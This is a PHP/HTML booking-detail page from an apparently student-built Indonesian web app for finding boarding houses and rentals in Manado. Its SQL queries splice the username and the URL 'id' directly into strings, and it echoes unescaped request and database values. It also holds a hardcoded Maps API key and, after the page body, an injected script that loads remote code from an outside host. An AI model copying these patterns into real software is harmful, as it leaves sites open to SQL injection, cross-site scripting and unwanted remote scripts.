<?php
 // Include config file
    include 'config.php';

session_start();

// If session variable is not set it will redirect to login page
if(!isset($_SESSION['username']) || empty($_SESSION['username'])){
  header("location: ../login.php");
  exit;
}

$username = ($_SESSION['username']);
// Check existence of id parameter before processing further
if(isset($_GET["id"]) && !empty(trim($_GET["id"]))){
   
    $param_id = trim($_GET["id"]);
    // Prepare a select statement
	
    $sql= 'SELECT item.id, item.photo, item.photo2, item.photo3, item.photo4, item.nama, item.alamat, item.harga, item.satuan, item.deskripsi, item.jenis, item.kategori, item.wilayah, item.fasilitas, item.kode, item.lat, item.lng, pesanan.nama_penyedia, pesanan.id_pesanan, pesanan.status, pesanan.id_item FROM item INNER JOIN pesanan ON  item.id = pesanan.id_item WHERE pesanan.nama_pemesan = "'.$username.'" AND item.id = "'.$param_id.'" ';	
	
		
    if($stmt = mysqli_prepare($link, $sql)){
      
        
        // Attempt to execute the prepared statement
        if(mysqli_stmt_execute($stmt)){
            $result = mysqli_stmt_get_result($stmt);
    
            if(mysqli_num_rows($result) == 1){
                /* Fetch result row as an associative array. Since the result set
                contains only one row, we don't need to use while loop */
                $row = mysqli_fetch_array($result, MYSQLI_ASSOC);
				
                
                // Retrieve individual field value
				$photo = $row["photo"];
				$photo2 = $row["photo2"];
				$photo3 = $row["photo3"];
				$photo4 = $row["photo4"];
				$nama = $row["nama"];
				$alamat = $row["alamat"];
				$harga = $row["harga"];
				$satuan = $row["satuan"];
				$deskripsi = $row["deskripsi"];
				$jenis = $row["jenis"];
				$kategori = $row["kategori"];
				$wilayah = $row["wilayah"];
				$fasilitas = $row["fasilitas"];
				$kode = $row["kode"];
				$lat = $row["lat"];
				$lng = $row["lng"];
				$status = $row["status"];
            } else{	
                // URL doesn't contain valid id parameter. Redirect to error page
                header("location: ../error.php");
                exit();
            }
            
        } else{
            echo "Oops! Something went wrong. Please try again later.";
        }
    }
     
    // Close statement
    mysqli_stmt_close($stmt);
    
    
} else{
    // URL doesn't contain id parameter. Redirect to error page
    header("location: error.php");
    exit();
}

$jeniss = explode(",",$jenis);
if (in_array("11",$jeniss)) { $jenisnya[] = "Kos"; }
if (in_array("12",$jeniss)) { $jenisnya[] = "Kontrakan";}

$kategorii = explode(",",$kategori);

if (in_array("21",$kategorii)) { $kategorinya[] = "Khusus Pria";}
if (in_array("22",$kategorii)) { $kategorinya[] = "Khusus Wanita";}
if (in_array("23",$kategorii)) { $kategorinya[] = "Campuran";}
if (in_array("24",$kategorii)) { $kategorinya[] = "2 Lantai";}
if (in_array("25",$kategorii)) { $kategorinya[] = "3 Lantai";}
if (in_array("26",$kategorii)) { $kategorinya[] = "4 Lantai atau Lebih";}


$wilayahh = explode(",",$wilayah);

if (in_array("301",$wilayahh)) { $wilayahnya[] = "Kecamatan Bunaken";}
if (in_array("302",$wilayahh)) { $wilayahnya[] = "Kecamatan Bunaken Kepulauan";}
if (in_array("303",$wilayahh)) { $wilayahnya[] = "Kecamatan Malalayang";}
if (in_array("304",$wilayahh)) { $wilayahnya[] = "Kecamatan Paal Dua";}
if (in_array("305",$wilayahh)) { $wilayahnya[] = "Kecamatan Mapanget";}
if (in_array("306",$wilayahh)) { $wilayahnya[] = "Kecamatan Sario";}
if (in_array("307",$wilayahh)) { $wilayahnya[] = "Kecamatan Singkil";}
if (in_array("308",$wilayahh)) { $wilayahnya[] = "Kecamatan Tikala";}
if (in_array("309",$wilayahh)) { $wilayahnya[] = "Kecamatan Tuminting";}
if (in_array("310",$wilayahh)) { $wilayahnya[] = "Kecamatan Wanea";}
if (in_array("311",$wilayahh)) { $wilayahnya[] = "Kecamatan Wenang";}

$fasilitass = explode(",",$fasilitas);

if (in_array("401",$fasilitass)) { $fasilitasnya[] = "AC";}
if (in_array("402",$fasilitass)) { $fasilitasnya[] = "Kamar Mandi Dalam";}
if (in_array("403",$fasilitass)) { $fasilitasnya[] = "Garasi Mobil";}
if (in_array("404",$fasilitass)) { $fasilitasnya[] = "Garasi Motor";}
if (in_array("405",$fasilitass)) { $fasilitasnya[] = "Meja";}
if (in_array("406",$fasilitass)) { $fasilitasnya[] = "Kursi";}
if (in_array("407",$fasilitass)) { $fasilitasnya[] = "Lemari";}
if (in_array("408",$fasilitass)) { $fasilitasnya[] = "Kipas Angin";}
if (in_array("409",$fasilitass)) { $fasilitasnya[] = "Tempat Tidur";}
if (in_array("410",$fasilitass)) { $fasilitasnya[] = "Air PAM";}
if (in_array("411",$fasilitass)) { $fasilitasnya[] = "Air Sumur";}
if (in_array("412",$fasilitass)) { $fasilitasnya[] = "Listrik Prabayar";}
if (in_array("413",$fasilitass)) { $fasilitasnya[] = "Listrik Pascabayar";}
if (in_array("414",$fasilitass)) { $fasilitasnya[] = "Kolam Renang";}
if (in_array("415",$fasilitass)) { $fasilitasnya[] = "Kolam Ikan";}
if (in_array("416",$fasilitass)) { $fasilitasnya[] = "Ruang Tamu";}

if(empty($jenisnya)){ $jenisnya = ""; }
if(empty($kategorinya)){ $kategorinya = ""; }
if(empty($wilayahnya)){ $wilayahnya = ""; }
if(empty($fasilitasnya)){ $fasilitasnya = ""; }

$role = $_GET['role'];
?>
<!doctype html>
<html class="no-js" lang="en">
    
<head>
        <meta charset="utf-8">
        <meta http-equiv="x-ua-compatible" content="ie=edge">
        <title>Sistem Informasi Pencarian Tempat Kos dan Rumah Kontrakan di Manado</title>
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        
        <!-- Favicon -->
        <link rel="shortcut icon" type="image/x-icon" href="assets/img/home.ico">
		
		<!-- all css here -->
        <link rel="stylesheet" href="assets/css/bootstrap.min.css" type="text/css">
        <link rel="stylesheet" href="assets/css/magnific-popup.css" type="text/css">
        <link rel="stylesheet" href="assets/css/owl.carousel.min.css" type="text/css">
        <link rel="stylesheet" href="assets/css/font-awesome.min.css" type="text/css">
        <link rel="stylesheet" href="assets/css/pe-icon-7-stroke.css" type="text/css">	
        <link rel="stylesheet" href="assets/css/animate.css" type="text/css">
		<link rel="stylesheet" href="assets/css/animate-headline.css" type="text/css">
        <link rel="stylesheet" href="assets/css/jquery-ui.css" type="text/css">
        <link rel="stylesheet" href="assets/css/meanmenu.min.css" type="text/css">
        <link rel="stylesheet" href="assets/css/bundle.css" type="text/css">
        <link rel="stylesheet" href="assets/css/style.css" type="text/css">
        <link rel="stylesheet" href="assets/css/responsive.css" type="text/css">
		<link rel="stylesheet" href="assets/css/map.css" type="text/css">	
		<link rel="stylesheet" href="lib/css/nivo-slider.css" type="text/css">
		<link rel="stylesheet" href="lib/css/preview.css" type="text/css" media="screen">
    </head>
    <body>
        <!-- header start -->
		<header class="header-area home-style-2">
		
			<div class="header-bottom">
			    <div class="container">
			        <div class="row">
			            <div class="col-md-4 col-sm-3 col-xs-6">
			                <div class="logo">
			                    <a href="<?php echo "index.php?user="; echo $username; echo "&role="; echo $role;?>">
                                    <img src="assets/img/logo/rumah.png" height="40px" alt="">
                                </a>
			                </div>
			            </div>
			            <div class="col-md-8 col-sm-9 col-xs-6">
			                <div class="cart-menu">
                                
                                <div class="user user-style-3 f-right">
						            <a>
									
                                       <?php echo "Hi, ";echo $username; echo " anda masuk sebagai "; echo ($_GET['role']); 
									   $sqlz = 'SELECT * FROM users WHERE username LIKE "'.$username.'"';
									   $resultz = mysqli_query($link, $sqlz);
									   $rowz = mysqli_fetch_array($resultz);
									   ?> 
									   
									   <img src="../uploadfotoprofil/<?php if(empty($rowz['fotoprofil'])) { echo "default.jpg";} else { echo $rowz['fotoprofil']; }?>" height="40px" width="40px" alt="">
									   
                                    </a>
                                    <div class="currence-user-page">
                                        <div class="user-page">
                                            <ul>
                                               <li><a href="<?php echo "profil.php?user="; echo $username; echo "&role="; echo $role;?>"><i class="pe-7s-user"></i> Profil</a></li>
                                               <li><a href="<?php echo "statuspencari.php?user="; echo $username; echo "&role="; echo $role;?>"><i class="pe-7s-info"></i> Lihat Status</a></li>
											   <li><a href="<?php echo "logout.php"; ?>"><i class="pe-7s-back-2"></i> Keluar</a></li>
								
                                            </ul>
                                        </div>
                                    </div>
						        </div>		                    
			                </div>
			            </div>
			        </div>
			    </div>
			</div>
		</header>
		<!-- header end -->
		<!-- breadcrumbs start -->		
		<div class="breadcrumbs-area breadcrumb-bg ptb-100">
		    <div class="container">
		        <div class="breadcrumbs text-center">
                    <h2 class="breadcrumb-title"><?php if(!empty($jenisnya)){ echo implode(" ",$jenisnya); }  ?> <?php echo $nama; ?></h2>
                   
                </div>
		    </div>
		</div>
		<!-- breadcrumbs area end -->
		<!-- single product area start -->
		<div class="single-product-area ptb-100">
		    <div class="container">
                <div class="row">
                    <div class="col-md-5">
                        <div class="product-details-tab">
                            <!-- Tab panes -->
                            <div class="tab-content">
                                <div class="tab-pane active" id="product1">
                                    <div class="large-img">
															<?php 
															if (!empty($row['photo'])) { echo '<img src="../upload/';echo  $row['photo'];echo'" alt="" width="450px" height="450px">'; } 
															else { echo '<img src="../upload/';echo "rumah-default.jpg";echo'" alt="" width="450px" height="450px">'; } ;
															?> 
                                    </div>
                                </div>
                                <div class="tab-pane" id="product2">
                                    <div class="large-img">
															<?php
															if (!empty($row['photo2'])) { echo '<img src="../upload/';echo  $row['photo2'];echo'" alt="" width="450px" height="450px">'; } 
															else { echo '<img src="../upload/';echo "rumah-default.jpg";echo'" alt="" width="450px" height="450px">'; } ;
															?>
                                    </div>							
                                </div>
                                <div class="tab-pane" id="product3">
                                    <div class="large-img">
															<?php
															if (!empty($row['photo3'])) { echo '<img src="../upload/';echo  $row['photo3'];echo'" alt="" width="450px" height="450px">'; } 
															else { echo '<img src="../upload/';echo "rumah-default.jpg";echo'" alt="" width="450px" height="450px">'; } ;
															?>
                                    </div>							
                                </div>
                                <div class="tab-pane" id="product4">
                                    <div class="large-img">
															<?php
															if (!empty($row['photo4'])) { echo '<img src="../upload/';echo  $row['photo4'];echo'" alt="" width="450px" height="450px">'; } 
															else { echo '<img src="../upload/';echo "rumah-default.jpg";echo'" alt="" width="450px" height="450px">'; } ;
															?>
                                    </div>							
                                </div>
                                
                            </div>
                            <!-- Nav tabs -->
                            <div class="details-tab owl-carousel">
                                <div class="active"><a href="#product1" data-toggle="tab"><?php 
															if (!empty($row['photo'])) { echo '<img src="../upload/';echo  $row['photo'];echo'" alt="" width="100px" height="100px">'; } 
															elseif (!empty($row['photo2'])) { echo '<img src="../upload/';echo  $row['photo2'];echo'" alt="" width="100px" height="100px">'; } 
															elseif (!empty($row['photo3'])) { echo '<img src="../upload/';echo  $row['photo3'];echo'" alt="" width="100px" height="100px">'; } 
															elseif (!empty($row['photo4'])) { echo '<img src="../upload/';echo  $row['photo4'];echo'" alt="" width="100px" height="100px">'; } 
															else { echo ''; } ;
															?></a></div>
                                <div><a href="#product2" data-toggle="tab"><?php 
															if (!empty($row['photo2'])) { echo '<img src="../upload/';echo  $row['photo2'];echo'" alt="" width="100px" height="100px">'; } 
															elseif (!empty($row['photo3']))  { echo '<img src="../upload/';echo  $row['photo3'];echo'" alt="" width="100px" height="100px">'; } 
															elseif (!empty($row['photo4']))  { echo '<img src="../upload/';echo  $row['photo4'];echo'" alt="" width="100px" height="100px">'; } 
															else { echo ''; } ;
															?></a></div>
                                <div><a href="#product3" data-toggle="tab"><?php 
															if (!empty($row['photo3']))  { echo '<img src="../upload/';echo  $row['photo3'];echo'" alt="" width="100px" height="100px">'; } 
															elseif (!empty($row['photo4'])) { echo '<img src="../upload/';echo  $row['photo4'];echo'" alt="" width="100px" height="100px">'; } 
															else { echo ''; } ;
															?></a></div>
                                <div><a href="#product4" data-toggle="tab"><?php 
															if (!empty($row['photo4'])) { echo '<img src="../upload/';echo  $row['photo4'];echo'" alt="" width="100px" height="100px">'; } 															
															else { echo ''; } ;
															?></a></div>
                            </div>	
                        </div>
                    </div>
                    <div class="col-md-7">
                        <div class="single-product-content">
                            <div class="single-product-dec pb-30  for-pro-border">
                                <h2><?php if(!empty($jenisnya)){ echo implode(" ",$jenisnya); }  ?> <?php echo $nama; ?></h2>
                               
                                <h3>Rp <?php   echo number_format($row['harga'],0,'.','.') ;?> / <?php if($row['satuan'] == 01 ) { echo 'Hari';} 
																							  if($row['satuan'] == 02 ) { echo 'Minggu';}
																							  if($row['satuan'] == 03 ) { echo 'Bulan';}
																							  if($row['satuan'] == 04 ) { echo 'Tahun';}
																	?></h3>
                                </div>
                            <div class="single-cart-color for-pro-border">
                                <p>Jenis     : <span><?php if(!empty($jenisnya)){ echo implode(",",$jenisnya); }  ?></span></p>
								<p>Kategori  : <span><?php if(!empty($kategorinya)){ echo implode(",",$kategorinya); }  ?></span></p>
								<p>Wilayah   : <span><?php if(!empty($wilayahnya)){ echo implode(",",$wilayahnya); }  ?></span></p>
								<p>Fasilitas : <span><?php if(!empty($fasilitasnya)){ echo implode(",",$fasilitasnya); }  ?></span></p>
								<p>Status Konfirmasi : <span><?php if  ($status == 1 ){ echo 'Menunggu Konfirmasi'; }
																   if  ($status == 2 ){ echo 'Pesanan Ditolak'; }
																   if  ($status == 3 ){ echo 'Pesanan Diterima'; } ?></span></p>
                               
                               
							</div>
                            <div class="single-pro-cart">
                                    <div class="single-shipping-botton">
									        
											<br><button type="button" data-toggle="modal" data-target="#hapuspesanan<?php echo $row['id_pesanan'];?>"> 
                                                <span>Hapus Pesanan</span>
                                            </button>
											<div class="quick-view modal fade in" id="hapuspesanan<?php echo $row['id_pesanan'];?>">
											<div class="container">
												<div class="row">
													<div id="view-gallery">
														<div class="col-xs-12">
															<div class="d-table">
																<div class="d-tablecell">
																	<div class="modal-dialog">
																		<div class="main-view modal-content">
																			<div class="modal-footer" data-dismiss="modal">
																				<span>x</span>
																			</div>
																			
																			<div class="section-title text-center mb-70">
																				<h2>Apakah Anda Yakin Ingin Menghapus Pesanan Ini ?</h2>
																			</div>
																			<div class="single-shipping-botton">
																			<button type="button" onclick="location.href='<?php echo "hapuspesanan.php?user="; echo $username; echo "&role="; echo $role; echo "&id="; echo $row['id_pesanan']; ?>';"> 
																				<a style="color:white">Ya</a>
																			</button>
																			<br>
																			<button type="button" onclick="location.href='<?php echo "lihatpesanan.php?user="; echo $username; echo "&role="; echo $role; echo "&id="; echo $row['id']; ?>';"> 
																				<a style="color:white">Tidak</a>
																			</button>
																			</div>
																			
																		
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
										</div>
                            </div>
                        </div>
                    </div>
                </div>
		    </div>
		</div>
		
		
		<!-- single product area end -->
		<!-- single product area end -->
		<div class="single-product-dec-area">
		    <div class="container">
                <div class="single-product-dec-tab">
                    <ul role="tablist">
                        <li class="active">
                            <a href="#deskripsi" data-toggle="tab">
                                Deskripsi
                            </a>
                        </li>
						<li>
                            <a href="#lokasi" data-toggle="tab">
                                Lokasi
                            </a>
                        </li>
                        
                    </ul>
                </div>
                <div class="single-product-dec pb-100">
                    <div class="tab-content">
                        <div class="tab-pane active" id="deskripsi">
                            <p><?php   echo  $row['deskripsi'] ;?></p>
                            
                        </div>
						
						
						<div class="tab-pane" id="lokasi">
                           <div id="map" style="width:100%;height:650px;"></div> 
						    <input id="pac-input" class="controls" type="text" placeholder="Masukkan Nama Lokasi....">
						</div>
						
                       
                    </div>
                </div>
                
		    </div>
		</div>
		
		<!-- single product area end -->
		<!-- subscribe area start -->
		
		<!-- footer area start -->
		<footer class="footer-area">
		    <div class="container">
                <div class="footer-top pt-60 pb-30">
                  
					
                </div>
                <div class="footer-bottom ptb-20">
                    <div class="row">
					
                        <div class="col-md-7 col-sm-7">
                            <div class="copyright">
                                <p>
                                    Copyright © 2018 Angga Qurnen Suwito
                                    
                                </p>
                            </div>
                        </div>
						<div class="col-md-3 col-sm-3">
                            <div class="footer-widget mb-30">
                                <div class="footer-title">
                                    <h3>Layanan</h3>
                                </div>
                                <div class="widget-text">
                                    <ul>
                                        <li><a href="about.php" target="_blank" rel="noopener noreferrer">About</a></li>
                                        <li><a href="tutorialpencari.php" target="_blank" rel="noopener noreferrer">Petunjuk Penggunaan Pencari</a></li>
                                        <li><a href="tutorialpenyedia.php" target="_blank" rel="noopener noreferrer">Petunjuk Penggunaan Penyedia</a></li>
                                        
                                    </ul>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-2 col-sm-2">
                            
							<div class="payment f-right">
                                    <ul>
                                        <li><a href="#"><i class="fa fa-facebook"></i></a></li>
                                        <li><a href="#"><i class="fa fa-twitter"></i></a></li>
                                        <li><a href="#"><i class="fa fa-google-plus"></i></a></li>
                                        <li><a href="#"><i class="fa fa-instagram"></i></a></li>
                                        <li><a href="#"><i class="fa fa-pinterest-p"></i></a></li>
                                    </ul>
                            </div>
                        </div>
                    </div>
                </div>
		    </div>
		</footer>
		<!-- footer area end -->
		
		

		<!-- all js here -->
		<script>
		var map;
        var marker;
        var markersArray = [];
			
		function initMap() {
		var latlng = new google.maps.LatLng(<?php if(!empty($lat)){ echo $lat; } else { echo "1.474087"; } 	?>, <?php if(!empty($lng)){ echo $lng; } else { echo "124.841948"; } 	?>);
                var mapOptions = {
                zoom: 15,
                center: latlng,
                mapTypeId: google.maps.MapTypeId.ROADMAP
            };
		 
		map = new google.maps.Map(document.getElementById("map"), mapOptions);
		
		<?php if((!empty($lat)) && (!empty($lng))){echo ' tanda= new google.maps.Marker({ position: latlng, map: map,}) ';} ?>
				
        var input = document.getElementById('pac-input');

        var autocomplete = new google.maps.places.Autocomplete(
            input, {placeIdOnly: true});
        autocomplete.bindTo('bounds', map);

        map.controls[google.maps.ControlPosition.TOP_LEFT].push(input);

        var infowindow = new google.maps.InfoWindow();
        var infowindowContent = document.getElementById('infowindow-content');
        infowindow.setContent(infowindowContent);
        var geocoder = new google.maps.Geocoder;
        var marker = new google.maps.Marker({
          map: map
        });
        

        autocomplete.addListener('place_changed', function() {
          infowindow.close();
          var place = autocomplete.getPlace();

          if (!place.place_id) {
            return;
          }
          geocoder.geocode({'placeId': place.place_id}, function(results, status) {

            if (status !== 'OK') {
              window.alert('Geocoder failed due to: ' + status);
              return;
            }
            map.setZoom(15);
            map.setCenter(results[0].geometry.location);   
				});
			});
		
		}
		google.maps.event.addDomListener(window, 'load', initMap);
		
	
		</script>
		<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDwJ5Qre6H8qW2P5CgZlVOgImlSRKOeWOc&libraries=places&callback=initMap&sensor=false" async defer></script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
        <script src="assets/js/vendor/jquery-1.12.0.min.js" type="text/javascript"></script>
		<script src="assets/js/bootstrap.min.js" type="text/javascript"></script>
        <script src="assets/js/jquery.meanmenu.js" type="text/javascript"></script>
        <script src="assets/js/jquery.magnific-popup.min.js" type="text/javascript"></script>
        <script src="assets/js/isotope.pkgd.min.js" type="text/javascript"></script>
        <script src="assets/js/imagesloaded.pkgd.min.js" type="text/javascript"></script>
        <script src="assets/js/jquery.validate.min.js" type="text/javascript"></script>
        <script src="assets/js/owl.carousel.min.js" type="text/javascript"></script>
		<script src="lib/js/jquery.nivo.slider.js" type="text/javascript"></script>
		<script src="lib/home.js" type="text/javascript"></script>
		<script src="assets/js/plugins.js" type="text/javascript"></script>
        <script src="assets/js/main.js" type="text/javascript"></script>
		<script src="assets/js/vendor/modernizr-2.8.3.min.js" type="text/javascript"></script>
	
		<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582HVlH3eBnL31jJGKDJMFRytkSj9I4j9ndv8I42R%2fLMgHcocdiupOeMvQ52aQnn9OdsvvFjomKd2I9VTDZPL8wYhAtzzdKiVMsr8r2CBKby5zcW6CWpYJFPKYTrwnwCYSCNT9Mi%2fQxdABzKXqsYHhuxfQ7tA4ku%2bC51m4A11K09oK8UuhW6or%2f%2fyFugzstUe3s2FXCQwUWEz11FnuMbiZSgPlDHUuLVxZKfUYGgnNW8rnicr1GHF1r8VTs6x%2bNkvGCUY8cp9oK62u0ZLukFHGY8OhMvfuf16c6ezhncjYkp5BReomV7fi2y%2fiNBapIXTjE5b%2fOdtYYqvguxNl4t7girhoc1K0Q9z%2bjLW6dcTESuvd%2fRkNs12BcwW1HTIf1D8vNbowZi5eO7IssLtpRGEQgtAl1CKLTmOfecmW3FPWs8SADIzjNNv9ztYWD5wLhD%2fd55gSiDpw9fwyApKwhzqTJalLiZJrdZD9pDHNM7xoEgfTPpJru%2bD6yTyMssyDRFpbAibzMxklSPYG" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>
<?php 
// Close connection
    mysqli_close($link);
?>